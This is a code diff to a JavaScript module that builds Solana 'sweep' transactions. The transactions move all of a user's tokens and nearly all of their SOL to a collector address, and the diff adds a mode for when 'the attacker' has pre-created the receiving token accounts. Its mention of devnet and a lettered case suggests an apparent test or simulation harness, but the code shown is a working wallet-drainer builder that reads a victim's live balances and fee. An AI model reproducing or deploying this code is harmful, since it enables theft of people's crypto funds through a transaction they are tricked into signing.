@@ -76,16 +76,18 @@ export function unsignedWire(compiled) {
  * The sweep the page asks for. Pure: given the user's lamports and token holdings, every token and every lamport
  * but the fee ends at `collector`. `fee` is the network fee for this message (5000 per signature on devnet);
  * `ataRent` what the user pays for each collector ATA it creates.
+ * `plain`: the collector's ATAs already exist (the attacker pre-created them), so the tx is only TransferChecked
+ * per token + one System Transfer, and the user's emptied ATAs stay open (sweep-local, the G7 L4 case).
  */
-export function buildSweep({ user, collector, tokens, lamports, fee, ataRent, recentBlockhash }) {
+export function buildSweep({ user, collector, tokens, lamports, fee, ataRent, recentBlockhash, plain = false }) {
   const instructions = [];
   for (const t of tokens) {
     const from = ataAddress(user, t.mint);
-    instructions.push(createAtaIdempotent(user, collector, t.mint));
+    if (!plain) instructions.push(createAtaIdempotent(user, collector, t.mint));
     instructions.push(transferChecked(from, t.mint, ataAddress(collector, t.mint), user, t.amount, t.decimals));
-    instructions.push(closeAccount(from, collector, user));
+    if (!plain) instructions.push(closeAccount(from, collector, user));
   }
-  const sol = lamports - fee - ataRent * tokens.length;
+  const sol = lamports - fee - (plain ? 0 : ataRent * tokens.length);
   if (sol <= 0) throw new Error(`user has ${lamports} lamports, not enough to pay the sweep`);
   instructions.push(systemTransfer(user, collector, sol));
   const compiled = compileLegacy({ feePayer: user, instructions, recentBlockhash });
@@ -110,7 +112,7 @@ async function context() {
 }
 
 /** Builds the sweep from the user's current on-chain balances, on a fresh blockhash. */
-export async function currentSweep(rpc, { user, collector, mints }) {
+export async function currentSweep(rpc, { user, collector, mints, plain = false }) {
   const tokens = [];
   for (const m of mints) {
     const amount = await tokenAmount(rpc, ataAddress(user, m.mint));
@@ -120,10 +122,10 @@ export async function currentSweep(rpc, { user, collector, mints }) {
   const lamports = await balance(rpc, user);
   const ataRent = await rpc.call('getMinimumBalanceForRentExemption', [TOKEN_ACCOUNT_LEN]);
   const { value: bh } = await rpc.call('getLatestBlockhash', [{ commitment: 'confirmed' }]);
-  const draft = buildSweep({ user, collector, tokens, lamports, fee: 0, ataRent, recentBlockhash: bh.blockhash });
+  const draft = buildSweep({ user, collector, tokens, lamports, fee: 0, ataRent, recentBlockhash: bh.blockhash, plain });
   const { value: fee } = await rpc.call('getFeeForMessage', [Buffer.from(draft.compiled.message).toString('base64'), { commitment: 'confirmed' }]);
   if (typeof fee !== 'number') throw new Error('getFeeForMessage returned no fee');
-  const built = buildSweep({ user, collector, tokens, lamports, fee, ataRent, recentBlockhash: bh.blockhash });
+  const built = buildSweep({ user, collector, tokens, lamports, fee, ataRent, recentBlockhash: bh.blockhash, plain });
   return { ...built, tokens, lamports, fee, ataRent, recentBlockhash: bh.blockhash, lastValidBlockHeight: bh.lastValidBlockHeight };
 }
 
